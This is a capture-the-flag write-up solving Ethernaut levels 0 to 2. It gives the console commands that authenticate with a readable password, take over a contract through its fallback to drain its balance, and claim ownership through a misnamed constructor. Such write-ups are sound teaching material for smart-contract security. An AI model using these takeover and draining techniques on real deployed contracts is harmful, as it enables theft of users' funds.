## Ethernaut Level0: Hello Ethernaut

## Commands I Used

### 1. Called info() to get the initial clue
```
await contract.info()
```
**Output:**  
`"You will find what you need in info1()."`

This was the first hint given in the level.

---

### 2. Inspected the contract object
```
await contract
```
To check what functions are available in the contract. I noticed a password() function.

---

### 3. Retrieved the password
```
await contract.password()
```
**Output:**  
`"ethernaut0"`

This is the password needed for authentication.

---

### 4. Submitted the password directly
```
await contract.authenticate(await contract.password())
```
**Output:**  
Transaction successful

### 5. Clicked "Submit Instance"  
Level completed 

## Output Proof
![Level Complete Output](assets/Hello_Ethernaut.png)
![2](assets/Hello_Ethernaut(1).png)


# Ethernaut Level 1: Fallback

##  Strategy

The fallback function in this contract sets msg.sender as the new owner only if:
1. The caller sends ETH to the contract and
2. The caller has already contributed some ether via the contribute() function.

Also, the initial owner starts with `1000 ether` in contributions, so our total contribution must exceed that to trigger ownership update via contribute(). 

---

## Commands I Used

### 1. Contributed a small amount to initialize `contributions[msg.sender] > 0`
```
await contract.contribute({value: toWei("0.0005")})
```
Enables the fallback function condition `contributions[msg.sender] > 0`.

---

### 2. Sent ETH directly to the contract to trigger the fallback function
```
await web3.eth.sendTransaction({from: player, to: contract.address, value: web3.utils.toWei("0.0001", "ether")})
```
This calls the `receive()` function, which sets me as the new `owner` since I already had a contribution.

---

### 3. Called `withdraw()` to drain the balance
```
await contract.withdraw()
```
Now that I’m the owner, I can withdraw the contract’s balance and fulfill the final objective.

---

### 4. Level completed

![Level Complete Output](assets/Fallback.png)


# Ethernaut Level 2: Fallout

## Strategy

- **Vulnerability**: The constructor in this contract is incorrectly named `Fal1out`. In Solidity versions prior to 0.7.0, the constructor should match the contract's name.
- **Exploit**: Since `Fal1out()` is a public function , anyone can call it. By calling `Fal1out()`, I was able to set myself as the contract's owner.

---

## Commands Used

### 1. Called the misnamed constructor to claim ownership
```
await contract.Fal1out()
```
This allowed me to set myself as the owner of the contract, as it was not treated as a constructor but a regular public function.

---

### 2. Verified ownership
```
await contract.owner()
```
I got my address as the output, confirming that I am now the owner of the contract

To check that I successfully became the owner after calling `Fal1out()`.

---

## Level completed

![Level Complete Output](assets/Fallout.png)
